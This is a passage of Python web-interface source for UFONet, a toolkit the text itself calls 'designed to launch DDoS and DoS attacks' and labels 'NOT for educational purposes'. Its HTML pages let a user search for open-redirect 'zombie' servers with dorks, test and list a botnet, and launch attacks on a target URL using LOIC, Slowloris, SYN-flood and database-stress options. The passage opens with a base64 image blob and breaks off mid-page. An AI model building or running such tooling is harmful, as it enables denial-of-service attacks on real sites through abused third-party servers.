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")

        self.pages["/"] = self.pages["/header"] + """<script language="javascript">
      function Start() {
        var win_start = window.open("gui","_parent","fullscreen=yes, titlebar=yes, top=180, left=320, width=640, height=460, resizable=yes", false);
      }
</script>
<script type="text/javascript">
var text="REMEMBER -> This code is NOT for educational purposes!!";
var delay=1;
var currentChar=1;
var destination="tt";
function type()
{
  if (document.getElementById)
  {
    var dest=document.getElementById(destination);
    if (dest)
    {
      dest.innerHTML=text.substr(0, currentChar);
      currentChar++
      if (currentChar>text.length)
      {
        currentChar=1;
        setTimeout("type()", 5000);
      }
      else
      {
        setTimeout("type()", delay);
      }
    }
  }
}
function startTyping(textParam, delayParam, destinationParam)
{
  text=textParam;
  delay=delayParam;
  currentChar=1;
  destination=destinationParam;
  type();
}
</script>
  <link rel="stylesheet" href="/js/ufo-cloud.css" />
</head>
<body bgcolor="black" text="yellow" style="font-family:Â Courier, 'Courier New', monospace;" onload="start()" onresize="resize()" onorientationchange="resize()" onmousedown="context.fillStyle='rgba(0,0,0,'+opacity+')'" onmouseup="context.fillStyle='rgb(0,0,0)'">
<canvas id="starfield" style="z-index:-1; background-color:#000000; position:fixed; top:0; left:0;"></canvas>
<center><br><br><br><br>
<table><tr><td><img src="/ufonet-logo.png"></td><td>
<div class="ufo-cloud">
		<ul>
			<li><a href="javascript:alert('Let them hate so long as they fear...');"><span></span>'oderint dum metuant'</a></li>
                        <li><a href="javascript:alert('In order to achieve what has been undertaken...');"><span></span>'ad susceptum perficiendum'</a></li>
                        <li><a href="javascript:alert('Out of order, comes chaos...');"><span></span>'chao ab ordo'</a></li>
			<li><a href="javascript:alert('The truth being enveloped by obscure things...');"><span></span>'obscuris vera involvens'</a></li>
			<li><a href="javascript:alert('Everything changes, nothing perishes...');"><span></span>'omnia mutantur, nihil interit'</a></li>
                        <li><a href="javascript:alert('One world...');"><span></span>'orbis unum'</a></li>
                        <li><a href="javascript:alert('If you want peace, prepare the war...');"><span></span>'si vis pacem, para bellum'</a></li>
                        <li><a href="javascript:alert('Man is a wolf to man...');"><span></span>'homo homini lupus'</a></li>
                        <li><a href="javascript:alert('Ignorance is the cause of fear...');"><span></span>'causa de timendi est nescire'</a></li>
                        <li><a href="javascript:alert('There is still time...');"><span></span>'adhuc tempus'</a></li>
                        <li><a href="javascript:alert('No regime is sustained for a long time exercising violence...');"><span></span>'iniqua nunquam regna perpetuo manent'</a></li>
                        <li><a href="javascript:alert('From one, learn all...');"><span></span>'ab uno disce omnes'</a></li>
                        <li><a href="javascript:alert('One for all, all for one...');"><span></span>'unus pro omnibus, omnes pro uno'</a></li>
                        <li><a href="javascript:alert('Do what you are doing...');"><span></span>'age quod agis'</a></li>
		</ul>
	</div>
</td></tr></table><br>
<hr>
<br /><b><a href="https://ufonet.03c8.net" target="_blank">UFONet</a></b> - is a toolkit designed to launch <a href="https://en.wikipedia.org/wiki/Distributed_denial-of-service" target="_blank">DDoS</a> and <a href="https://en.wikipedia.org/wiki/Denial-of-service_attack" target="_blank">DoS</a> attacks.<br /><br />
<div id="tt">REMEMBER -> This code is NOT for educational purposes!!</div><br />
<script type="text/javascript">
startTyping(text, 80, "tt");
</script><hr><br />
<button title="Start to fly with your UFONet mothership..." onclick="Start()" style="color:yellow; height:40px; width:240px; font-weight:bold; background-color:red; border: 2px solid yellow;">START MOTHERSHIP!</button>""" + self.pages["/footer"]

        self.pages["/gui"] = self.pages["/header"] + """<script>function News() {
        var win_requests = window.open("news","_blank","fullscreen=no, scrollbars=1, titlebar=no, toolbar=no, location=no, status=no, menubar=no, top=190, left=360, width=860, height=480, resizable=yes", false);
      }
</script>
<script>function Missions() {
        var win_requests = window.open("missions","_blank","fullscreen=no, scrollbars=1, titlebar=no, toolbar=no, location=no, status=no, menubar=no, top=190, left=360, width=860, height=480, resizable=yes", false);
      }
</script>
<script>function Stats() {
        var win_requests = window.open("stats","_blank","fullscreen=no, scrollbars=1, titlebar=no, toolbar=no, location=no, status=no, menubar=no, top=190, left=360, width=860, height=480, resizable=yes", false);
      }
</script>
<script>function Board() {
        var win_requests = window.open("board","_blank","fullscreen=no, scrollbars=1, titlebar=no, toolbar=no, location=no, status=no, menubar=no, top=190, left=360, width=860, height=480, resizable=yes", false);
      }
</script>
</head>
<body bgcolor="black" text="yellow" style="font-family:Â Courier, 'Courier New', monospace;" onload="start()" onresize="resize()" onorientationchange="resize()" onmousedown="context.fillStyle='rgba(0,0,0,'+opacity+')'" onmouseup="context.fillStyle='rgb(0,0,0)'">
<canvas id="starfield" style="z-index:-1; background-color:#000000; position:fixed; top:0; left:0;"></canvas>
<center>
<table cellpadding="38" cellspacing="38">
<tr>
 <td>
<div class="ringMenu">
<ul>
  <li class="main"><a target="_blank" href="wormhole">Wormhole</a></li>
  <li class="top"><a href="botnet">Botnet</a></li>
  <li class="right"><a href="inspect">Inspect</a></li>
  <li class="bottom"><a href="attack">Attack</a></li>
  <li class="left"><a href="help">Help</a></li>
</ul>
</div>
 </td>
 <td>
<table border="1" bgcolor="black" cellpadding="24" cellspacing="25">
<tr>
<td>
<pre>Welcome to <a href="https://ufonet.03c8.net/FAQ.html" target="_blank">#UFONet</a> [C&C/DarkNet] ;-)

----------------------------------
""" + self.options.version + """ 
 - Rel: """ + self.release_date + """ - Dep: """ + time.ctime(os.path.getctime('ufonet')) + """ 

 | <a href='javascript:runCommandX("cmd_check_tool")'>Auto-update</a> | <a href="https://code.03c8.net/epsylon/ufonet" target="_blank">Source</a> - <a href="https://github.com/epsylon/ufonet" target="_blank">Mirror</a> |

-----------------------------------

Mothership ID: <b>""" + str(self.mothership_id) + """</b>
 - Your ranking is: <b>""" + str(self.ranking) + """</b>
"""+str(self.current_tasks)+"""</td>
<td>
<table>
<tr>
<td><img src="/images/aliens/alien1.png" onclick="News()"></td>
<td><img src="/images/aliens/alien2.png" onclick="Missions()"></td>
</tr>
<tr>
<td><img src="/images/aliens/alien5.png" onclick="Stats()"></td>
<td><img src="/images/aliens/alien4.png" onclick="Board()"></td>
</tr>
</table>
</td>
</tr>
</table> 
 </td>
</tr>
</table>
<div id="cmdOut"></div>
""" + self.pages["/footer"]

        self.pages["/botnet"] = self.pages["/header"] + """<script language="javascript"> 
function Requests() {
        var win_requests = window.open("requests","_blank","fullscreen=no, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function Maps() {
        var win_map = window.open("cmd_view_army","_blank","fullscreen=yes, resizable=yes", false);
        win_map.resizeTo(screen.width,screen.height);
      }
function Start(){
        dork=document.getElementById("dork").value
        s_engine = document.getElementById('engines_list').options[document.getElementById('engines_list').selectedIndex].text;
        if (document.getElementById("autosearch").checked){
        document.getElementById("autosearch").value = "on";
        } else {
        document.getElementById("autosearch").value = "off";
        }
        autosearch = document.getElementById("autosearch").value
        if (document.getElementById("dork_list").checked){
        document.getElementById("dork_list").value = "on";
        } else {
        document.getElementById("dork_list").value = "off";
        }
        dork_list = document.getElementById("dork_list").value
        if(dork == "" && dork_list == "off" && autosearch == "off") {
          window.alert("You need to enter a source for dorking...");
          return
         }else{
          if (document.getElementById("all_engines").checked){
          document.getElementById("all_engines").value = "on";
          } else {
          document.getElementById("all_engines").value = "off";
          }
          all_engines = document.getElementById("all_engines").value
          params="autosearch="+escape(autosearch)+"&dork="+escape(dork)+"&dork_list="+escape(dork_list)+"&s_engine="+escape(s_engine)+"&all_engines="+escape(all_engines)
        runCommandX("cmd_search",params)      
         }
      }
function showHide() 
     {
        if(document.getElementById("dork_list").checked) 
        {
         document.getElementById("dork_pattern").style.display = "none";
         document.getElementById("autosearch_pattern").style.display = "none";
        } 
        else {
         document.getElementById("dork_pattern").style.display = "";
         document.getElementById("autosearch_pattern").style.display = "";
        }
     }
function showHideEngines()
     {
        if(document.getElementById("all_engines").checked)
        {
         document.getElementById("s_engine").style.display = "none";
        }
        else {
         document.getElementById("s_engine").style.display = "";
        }
     }
function HideAll() 
     {
        if(document.getElementById("autosearch").checked) 
        {
         document.getElementById("s_engine").style.display = "none";
         document.getElementById("dork_pattern").style.display = "none";
         document.getElementById("list_pattern").style.display = "none";
         document.getElementById("allengines_pattern").style.display = "none";
         document.getElementById("all_engines").checked = false;
         document.getElementById("dork_list").checked = false;
         document.getElementById("dork").value = "";
        } 
        else {
         document.getElementById("s_engine").style.display = "";
         document.getElementById("dork_pattern").style.display = "";
         document.getElementById("list_pattern").style.display = "";
         document.getElementById("allengines_pattern").style.display = "";
        }
     }
</script>
<script>function Blackholes() {
        var win_requests = window.open("blackholes","_blank","fullscreen=no, scrollbars=1, titlebar=no, toolbar=no, location=no, status=no, menubar=no, top=190, left=360, width=860, height=480, resizable=yes", false);
      }
</script>
</head>
<body bgcolor="black" text="yellow" style="font-family:Â Courier, 'Courier New', monospace;" onload="start()" onresize="resize()" onorientationchange="resize()" onmousedown="context.fillStyle='rgba(0,0,0,'+opacity+')'" onmouseup="context.fillStyle='rgb(0,0,0)'">
<canvas id="starfield" style="z-index:-1; background-color:#000000; position:fixed; top:0; left:0;"></canvas>
<center>
<table cellpadding="38" cellspacing="38">
<tr>
 <td>
<div class="ringMenu">
<ul>
  <li class="main"><a href="botnet">Botnet</a></li>
  <li class="top"><a href="help">Help</a></li>
  <li class="right"><a href="inspect">Inspect</a></li>
  <li class="bottom"><a href="attack">Attack</a></li>
  <li class="left"><a href="gui">RETURN</a></li>
</ul>
</div>
 </td>
 <td>
<table bgcolor="black" cellpadding="24" cellspacing="25" border="1">
<tr><td>
<pre>
 <button title="Configure how you will perform requests (proxy, HTTP headers, etc)..." onclick="Requests()">Configure requests</button> | * View Botnet: <button title="Build a map and geo-deploy your botnet on it..." onclick="Maps()">Generate map!</button>
<form method='GET'><br/><hr><div id="autosearch_pattern" style="display:block;">  
  * Search automatically (may take time!) <input type="checkbox" id="autosearch" onchange="HideAll()"></div><div id="dork_pattern" style="display:block;">  
  * Search using a dork: <input type="text" name="dork" id="dork" size="20" placeholder="proxy.php?url="></div><div id="list_pattern" style="display:block;">  
  * Search using a list (from: botnet/dorks.txt): <input type="checkbox" id="dork_list" onchange="showHide()"></div><div id="s_engine" name="s_engine" style="display:block;">  
  * Search using this search engine: <select id="engines_list">
<!-- <option value="duck" selected>duck</option> [09/08/2016: deprecated! -> duck has removed 'inurl' operator]-->
  <option value="bing">bing</option>
  <option value="yahoo">yahoo</option>
<!--  <option value="google">google (no TOR!)</option>-->
<!--  <option value="yandex">yandex</option>-->
  </select></div><div id="allengines_pattern" style="display:block;">
  * Search using all search engines: <input type="checkbox" name="all_engines" id="all_engines" onchange="showHideEngines()"></div></form>
  <button title="Start to search for zombies..." style="color:yellow; height:40px; width:240px; font-weight:bold; background-color:red; border: 2px solid yellow;" onClick=Start()>SEARCH!</button>
<br><hr>
  * Test Botnet: <br><br><center><a href='javascript:runCommandX("cmd_test_offline")'>Offline</a> | <a href='javascript:runCommandX("cmd_test_all")'>ALL</a> | <a href='javascript:runCommandX("cmd_test_army")'>Zombies</a> | <a href='javascript:runCommandX("cmd_test_rpcs")'>XML-RPCs</a> | <a href='javascript:runCommandX("cmd_attack_me")'>Attack Me!</a></center></td>
<td>
<table cellpadding="5" cellspacing="2">
<tr>
<td><img src="/images/aliens/alien3.png" onclick="Blackholes()"></td>
</tr>
<tr>
<table><tr>
<td>Total Botnet = <b><a href='javascript:runCommandX("cmd_list_army")'><font size='5'>"""+ self.total_botnet +"""</font></a></b></td>
</tr>
<tr><td><hr></td></tr>
<tr><td><table align="right"><tr><td>Zombies:</td><td><a href='javascript:runCommandX("cmd_list_zombies")'>"""+self.num_zombies+"""</a></td></tr></table></td></tr>
<tr><td><table align="right"><tr><td>Aliens:</td><td><a href='javascript:runCommandX("cmd_list_aliens")'>"""+self.num_aliens+"""</a></td></tr></table></td></tr>
<tr><td><table align="right"><tr><td>Droids:</td><td><a href='javascript:runCommandX("cmd_list_droids")'>"""+self.num_droids+"""</a></td></tr></table></td></tr>
<tr><td><table align="right"><tr><td>UCAVs:</td><td><a href='javascript:runCommandX("cmd_list_ucavs")'>"""+self.num_ucavs+"""</a></td></tr></table></td></tr>
<tr><td><table align="right"><tr><td>XML-RPCs:</td><td><a href='javascript:runCommandX("cmd_list_rpcs")'>"""+self.num_rpcs+"""</a></td></tr></table></td></tr>
</table>
</table>
</td>
</tr></table>
</td>
</tr></table>
<hr>
<div id="cmdOut"></div>
""" + self.pages["/footer"]

        self.pages["/attack"] = self.pages["/header"] + """<script language="javascript"> 
function Requests() {
        var win_requests = window.open("requests","_blank","fullscreen=no, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function Grid() {
        var win_requests = window.open("grid","_blank","fullscreen=no, scrollbars=1, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function Wargames() {
        var win_requests = window.open("wargames","_blank","fullscreen=no, scrollbars=1, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function ShowPanel() {
        if (document.getElementById("extra_attack").checked){
               document.getElementById("extra_panel").style.display = "block";
               document.getElementById("loic").value = "";
               document.getElementById("loris").value = "";
               document.getElementById("ufosyn").value = "";
               document.getElementById("dbstress").value = "";
             } else {
               document.getElementById("extra_panel").style.display = "none";
               document.getElementById("loic").value = "";
               document.getElementById("loris").value = "";
               document.getElementById("ufosyn").value = "";
               document.getElementById("dbstress").value = "";
             }
      }
function Maps() {
         var win_map = window.open("/cmd_view_attack?target="+target,"_blank","fullscreen=yes, resizable=yes", false);
         win_map.resizeTo(screen.width,screen.height);
      }
function Start(){
	target=document.getElementById("target").value
        String.prototype.startsWith = function(prefix){
        return this.indexOf(prefix) === 0;
        }
        if(target.startsWith("http")){
             path=document.getElementById("path").value
             rounds=document.getElementById("rounds").value
             dbstress=document.getElementById("dbstress").value
             loic=document.getElementById("loic").value
             loris=document.getElementById("loris").value
             ufosyn=document.getElementById("ufosyn").value
             if(ufosyn){ // root required!
                 window.alert("You need 'root' access to use UFOSYN, so your shell is waiting for you to enter a password. Check it!");
	     }
             params="path="+escape(path)+"&rounds="+escape(rounds)+"&target="+escape(target)+"&dbstress="+escape(dbstress)+"&loic="+escape(loic)+"&loris="+escape(loris)+"&ufosyn="+escape(ufosyn)
             if (document.getElementById("visual_attack").checked){
                document.getElementById("visual_attack").value = "on";
             } else {
                document.getElementById("visual_attack").value = "off";
             }
             if(document.getElementById("visual_attack").value=="on"){
                Maps() 
             }
        }else{
          window.alert("You need to enter a valid url: http(s)://target.com");
          return
        }
	runCommandX("cmd_attack",params)
}
</script>
</head>
<body bgcolor="black" text="yellow" style="font-family:Â Courier, 'Courier New', monospace;" onload="start()" onresize="resize()" onorientationchange="resize()" onmousedown="context.fillStyle='rgba(0,0,0,'+opacity+')'" onmouseup="context.fillStyle='rgb(0,0,0)'">
<canvas id="starfield" style="z-index:-1; background-color:#000000; position:fixed; top:0; left:0;"></canvas>
<center>
<table cellpadding="38" cellspacing="38">
<tr>
 <td>
<div class="ringMenu">
<ul>
  <li class="main"><a href="attack">Attack</a></li>
  <li class="top"><a href="help">Help</a></li>
  <li class="right"><a href="botnet">Botnet</a></li>
  <li class="bottom"><a href="inspect">Inspect</a></li>
  <li class="left"><a href="gui">RETURN</a></li>
</ul>
</div>
 </td>
 <td>
<table bgcolor="black" cellpadding="24" cellspacing="25" border="1">
<tr><td>
<pre>
  * Set your target:     <input type="text" name="target" id="target" size="30" placeholder="http(s)://" required pattern="https?://.+">

  * Set place to attack: <input type="text" name="path" id="path" size="30" placeholder="/path/big.jpg">

  * Number of rounds:    <input type="text" name="rounds" id="rounds" size="5" value="1">

<hr>
  <button title="Configure how you will perform requests (proxy, HTTP headers, etc)..." onclick="Requests()">Configure requests</button> | <input type="checkbox" name="visual_attack" id="visual_attack"> Generate map! | <input type="checkbox" name="extra_attack" id="extra_attack" onclick='javascript:ShowPanel();'> Extra(s)

<hr><div id="extra_panel" style="display:none;">
  * Number of <a href="https://en.wikipedia.org/wiki/Low_Orbit_Ion_Cannon" target="_blank">LOIC</a> requests:   <input type="text" name="loic" id="loic" size="4" placeholder="100">
  * Number of <a href="https://en.wikipedia.org/wiki/Slowloris_(software)" target="_blank">LORIS</a> requests:  <input type="text" name="loris" id="loris" size="4" placeholder="101">
  * Number of <a href="https://en.wikipedia.org/wiki/SYN_flood" target="_blank">UFOSYN</a> requests: <input type="text" name="ufosyn" id="ufosyn" size="4" placeholder="100">

<hr>
  * Set db stress parameter:   <input type="text" name="dbstress" id="dbstress" size="22" placeholder="search.php?q=">

<hr></div>
  <button title="Start to attack your target..." onClick=Start() style="color:yellow; height:40px; width:240px; font-weight:bold; background-color:red; border: 2px solid yellow;">ATTACK!</button> | Total Botnet = <b><a href='javascript:runCommandX("cmd_list_army")'><font size='5'>"""+ self.total_botnet +"""</font></a></b></pre>
</td><td>
<table><tr><td><img src="/images/aliens/alien6.png" onclick="Grid()"></td></tr><tr><td><img src="/images/aliens/alien8.png" onclick="Wargames()"></td></tr></table>
</td></tr></table>
 </td></tr></table>
<hr>
<div id="cmdOut"></div>
""" + self.pages["/footer"]

        self.pages["/help"] = self.pages["/header"] + """<script language="javascript"> 
function show(one) {
      var nb = document.getElementsByTagName("div");
            for(var x=0; x<nb.length; x++) {
                  name = nb[x].getAttribute("class");
                  if (name == 'nb') {
                        if (nb[x].id == one) {
                        nb[x].style.display = 'block';
                  }
                  else {
                        nb[x].style.display = 'none';
                  }
            }
      }
}
</script>
<style>.container{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;}svg{max-width:8rem;}.masking{-webkit-transform: scale(0);transform:scale(0);-webkit-transform-origin:178px;transform-origin:178px;-webkit-animation: scale 3s linear infinite; animation: scale 3s linear infinite;}@-webkit-keyframes scale{80%{opacity: 1;}100%{-webkit-transform: scale(1);transform: scale(1);opacity: 0;}}@keyframes scale{80% {opacity: 1;}100%{-webkit-transform: scale(1);transform: scale(1);opacity: 0;}}</style>
</head>
<body bgcolor="black" text="yellow" style="font-family:Â Courier, 'Courier New', monospace;" onload="start()" onresize="resize()" onorientationchange="resize()" onmousedown="context.fillStyle='rgba(0,0,0,'+opacity+')'" onmouseup="context.fillStyle='rgb(0,0,0)'">
<canvas id="starfield" style="z-index:-1; background-color:#000000; position:fixed; top:0; left:0;"></canvas>
<center>
<table cellpadding="38" cellspacing="38">
<tr>
 <td>
<div class="ringMenu">
<ul>
  <li class="main"><a href="help">Help</a></li>
  <li class="top"><a href="botnet">Botnet</a></li>
  <li class="right"><a href="inspect">Inspect</a></li>
  <li class="bottom"><a href="attack">Attack</a></li>
  <li class="left"><a href="gui">RETURN</a></li>
</ul>
</div>
 </td>
 <td>
<table cellpadding="24" cellspacing="25" border="1">
<tr><td><pre>
<div><a id="mH1" href="javascript:show('nb1');" style="text-decoration: none;" >+ Project info</a></div>
<div class="nb" id="nb1" style="display: none;">  <b>UFONet</b> - is a set of tools designed to launch <a href="https://en.wikipedia.org/wiki/Distributed_denial-of-service" target="_blank">DDoS</a> and <a href="https://en.wikipedia.org/wiki/Denial-of-service_attack" target="_blank">DoS</a> attacks
            and that allows to combine both in a single offensive.
   </div><div><a id="mH2" href="javascript:show('nb2');" style="text-decoration: none;" >+ How does it work?</a></div> <div class="nb" id="nb2" style="display: none;">  You can read more info on next links:

      - <a href="https://cwe.mitre.org/data/definitions/601.html" target="_blank">CWE-601:Open Redirect</a>
      - <a href="https://www.owasp.org/index.php/OWASP_Periodic_Table_of_Vulnerabilities_-_URL_Redirector_Abuse2" target="_blank">OWASP:URL Redirector Abuse</a>
      - <a href="https://ufonet.03c8.net/ufonet/ufonet-schema.png" target="_blank">UFONet:Botnet Schema</a></div> <div><a id="mH3" href="javascript:show('nb3');" style="text-decoration: none;" >+ How to start?</a></div> <div class="nb" id="nb3" style="display: none;">  All you need to start an attack is:
   
      - a list of '<a href="https://en.wikipedia.org/wiki/Zombie" target="_blank">zombies</a>'; to conduct their connections to your target
      - a place; to efficiently hit your target</div> <div><a id="mH4" href="javascript:show('nb4');" style="text-decoration: none;" >+ Updating</a></div><div class="nb" id="nb4" style="display: none;">
  This feature can be used <u>ONLY</u> if you have cloned UFONet.

       - <i>git clone <a href="https://github.com/epsylon/ufonet" target="_blank">https://github.com/epsylon/ufonet</a></i>       
       - <i>git clone <a href="https://code.03c8.net/epsylon/ufonet" target="_blank">https://code.03c8.net/epsylon/ufonet</a></i>
</div><div>
<a id="mH5" href="javascript:show('nb5');" style="text-decoration: none;" >+ FAQ/Issues?</a></div><div class="nb" id="nb5" style="display: none;">
  If you have problems with UFONet, try to solve them following next links:

      - <a href="https://ufonet.03c8.net/FAQ.html" target="_blank">Website FAQ</a> section
      - UFONet <a href="https://github.com/epsylon/ufonet/issues" target="_blank">issues</a></div>
<div><a id="mH6" href="javascript:show('nb6');" style="text-decoration: none;" >+ How can I help?</a></div> <div class="nb" id="nb6" style="display: none;">      - Testing; use the tool and search for possible bugs and new ideas
      - Coding; you can try to develop more features
      - Promoting; talk about UFONet on the internet, events, hacklabs, etc
      - Donating; <a href="https://blockchain.info/address/19aXfJtoYJUoXEZtjNwsah2JKN9CK5Pcjw" target="_blank">bitcoin</a>, objects, support, love ;-)</div> <div><a id="mH7" href="javascript:show('nb7');" style="text-decoration: none" >+ Contact methods</a></div> <div class="nb" id="nb7" style="display: none;">  You can contact using:
   
      - Email: <a href="mailto: epsylon@riseup.net">epsylon@riseup.net</a> [GPG:0xB8AC3776]
      - <a target="_blank" href="wormhole">Wormhole</a>: irc.freenode.net / #ufonet
</div></td> </tr></table> </td></tr></table>
""" + self.pages["/footer"]

        self.pages["/inspect"] = self.pages["/header"] + """<script language="javascript"> 
function Requests() {
        var win_requests = window.open("requests","_blank","fullscreen=no, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function Abduction() {
        var win_requests = window.open("abduction","_blank","fullscreen=no, scrollbars=1, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function Start(){
        target=document.getElementById("target").value
        String.prototype.startsWith = function(prefix){
        return this.indexOf(prefix) === 0;
        }
        if(target.startsWith("http")){
        params="target="+escape(target)

        }else{
          window.alert("You need to enter a valid url: http(s)://target.com/page.html");
          return
        }
        runCommandX("cmd_inspect",params)
}
</script>
</head>
<body bgcolor="black" text="yellow" style="font-family:Â Courier, 'Courier New', monospace;" onload="start()" onresize="resize()" onorientationchange="resize()" onmousedown="context.fillStyle='rgba(0,0,0,'+opacity+')'" onmouseup="context.fillStyle='rgb(0,0,0)'">
<canvas id="starfield" style="z-index:-1; background-color:#000000; position:fixed; top:0; left:0;"></canvas>
<center>
<table cellpadding="38" cellspacing="38">
<tr>
 <td>
<div class="ringMenu">
<ul>
  <li class="main"><a href="inspect">Inspect</a></li>
  <li class="top"><a href="help">Help</a></li>
  <li class="right"><a href="botnet">Botnet</a></li>
  <li class="bottom"><a href="attack">Attack</a></li>
  <li class="left"><a href="gui">RETURN</a></li>
</ul>
</div>
 </td>
 <td>
<table bgcolor="black" cellpadding="24" cellspacing="25" border="1">
<tr>
<td>
<pre>
  This feature will provide you the biggest file on target. 
